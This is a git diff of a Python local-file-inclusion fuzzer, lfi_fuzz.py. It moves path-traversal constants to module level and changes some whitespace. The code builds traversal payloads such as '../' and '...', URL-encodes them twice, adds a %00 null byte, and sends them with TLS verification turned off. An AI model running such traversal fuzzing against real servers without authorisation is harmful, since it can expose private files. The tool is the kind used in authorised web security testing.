@@ -8,11 +8,11 @@ import urllib3
 
 urllib3.disable_warnings()
 
-DOT = "."
 DDS = "../"
 DS = "./"
 SLASH = "/"
 RSLASH = "\\"
+DOTS = "..."
 
 def help():
     print("\t-u URL, --url=URL\tscan url")
@@ -30,13 +30,7 @@ def help():
     print("\tlfi_fuzz.py -u http://example.com -p test --cookie session=test,path=/")
 
 
-def lfi_fuzz(url, path, hcode=(), hsize=(), htext=(), cookie=None, depth=8):
-    DDS = "../"
-    DS = "./"
-    SLASH = "/"
-    RSLASH = "\\"
-    DOTS = "..."
- 
+def lfi_fuzz(url, path, hcode=(), hsize=(), htext=(), cookie=None, depth=8): 
     payloads_lfi = [f"{DOTS}", f"{DDS}", f"{DS}", f"{SLASH}", f"{RSLASH}"]
     
     for n in range(1, depth + 1):             
@@ -61,7 +55,7 @@ def lfi_fuzz(url, path, hcode=(), hsize=(), htext=(), cookie=None, depth=8):
                     print(common.good_code(resp.status_code, f" {url}{common.double_urlencode(payload)} [code:{resp.status_code} size:{len(resp.content)}]"))            	
                 resp = requests.get(f"{url}{common.double_urlencode(payload)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                 if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
-                    print(common.good_code(resp.status_code, f" {url}{common.double_urlencode(payload)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))                
+                    print(common.good_code(resp.status_code, f" {url}{common.double_urlencode(payload)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))              
 
     
 def main():
